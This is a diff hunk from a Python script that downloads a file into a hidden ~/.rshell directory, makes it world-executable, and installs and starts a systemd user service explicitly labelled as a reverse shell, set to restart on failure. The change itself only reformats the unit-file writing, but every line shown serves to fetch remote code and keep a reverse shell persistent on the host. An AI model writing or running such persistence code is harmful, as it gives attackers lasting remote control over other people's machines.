@@ -12,22 +12,22 @@ urllib.request.urlretrieve(RS3, f"/home/{USERNAME}/.rshell/rs3.py")
 
 os.chmod(f"/home/{USERNAME}/.rshell/rs3.py",0o777)
 
-with open("~/.config/systemd/user/rs.service","w") as unit_file:
-	unit_file.write(f"""
-	Description= Unit file for reverse shell.
+unit_file = open("~/.config/systemd/user/rs.service","w")
+unit_file.write(f"""
+Description= Unit file for reverse shell.
 
-	Wants=network.target
-	After=syslog.target network-online.target
+Wants=network.target
+After=syslog.target network-online.target
 
-	[Service]
-	Type=simple
-	ExecStart=/home/{USERNAME}/.rshell/./rs3.py
-	Restart=on-failure
-	RestartSec=10
-	KillMode=process
+[Service]
+Type=simple
+ExecStart=/home/{USERNAME}/.rshell/./rs3.py
+Restart=on-failure
+RestartSec=10
+KillMode=process
 
-	[Install]
-	WantedBy=multi-user.target""")
+[Install]
+WantedBy=multi-user.target""")
 
-
+unit_file.close()
 os.system("systemctl --user start rs.service")
